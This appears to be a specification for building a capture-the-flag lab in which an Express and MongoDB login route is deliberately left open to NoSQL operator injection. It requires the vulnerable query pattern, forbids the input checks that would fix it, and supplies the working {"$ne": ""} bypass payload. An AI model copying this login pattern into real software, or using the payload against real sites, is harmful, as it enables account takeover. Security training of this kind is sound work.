# NoSQL Injection — Authentication Bypass

## Vulnerability Type
`nosqli_auth_bypass` — CWE-943 — OWASP A03:2021 Injection

## Architecture
- **Backend**: Node.js Express
- **Database**: MongoDB (via `mongoose` or native `mongodb` driver)
- **Containers**: `app` (Node.js) + `db` (mongo:6)

## Vulnerable Code Pattern (MUST USE)

```javascript
// VULNERABLE: nosqli_auth_bypass — req.body passed directly to MongoDB query
app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    // Direct object injection: if client sends {"username": {"$ne": ""}}
    // MongoDB interprets it as a query operator
    const user = await User.findOne({ username: username, password: password });
    if (user) {
        return res.json({ message: "Welcome!", flag: user.flag || process.env.FLAG });
    }
    return res.status(401).json({ message: "Invalid credentials" });
});
```

**CRITICAL**: The Express app MUST use `express.json()` so JSON objects in req.body are preserved as objects (not stringified). This is what enables `{"$ne": ""}` injection.

## Secure Code Pattern (MUST AVOID)
```javascript
// SAFE — type checking (DO NOT USE)
if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: "Invalid input" });
}
// SAFE — mongo-sanitize (DO NOT USE)
const sanitize = require('mongo-sanitize');
const user = await User.findOne({ username: sanitize(username) });
```

## Database Schema
```javascript
// Mongoose model
const userSchema = new mongoose.Schema({
    username: String,
    password: String,
    flag: String,
    role: String,
});
// Seed data
User.create({ username: 'admin', password: 'SuperSecretPass!', flag: 'FLAG_PLACEHOLDER', role: 'admin' });
```

## Flag Delivery
- Flag stored in the admin user document's `flag` field
- Returned in JSON response on successful login
- Player uses operator injection to bypass authentication

## Exploit Payload
```json
POST /login
Content-Type: application/json

{"username": {"$ne": ""}, "password": {"$ne": ""}}
```
This matches any user where username and password are not empty → returns admin.

## Docker Setup
```yaml
services:
  app:
    build: .
    ports:
      - "3000:3000"
    environment:
      - MONGO_URL=mongodb://db:27017/ctflab
      - FLAG=FLAG_PLACEHOLDER
    depends_on:
      - db
  db:
    image: mongo:6
```

## Validation Criteria
- `express.json()` middleware MUST be used (enables object injection)
- No type checking on `req.body.username` or `req.body.password`
- No `mongo-sanitize` or similar library
- MongoDB query uses `findOne` with direct `req.body` fields
- `{"$ne": ""}` operator injection must return the admin user with flag
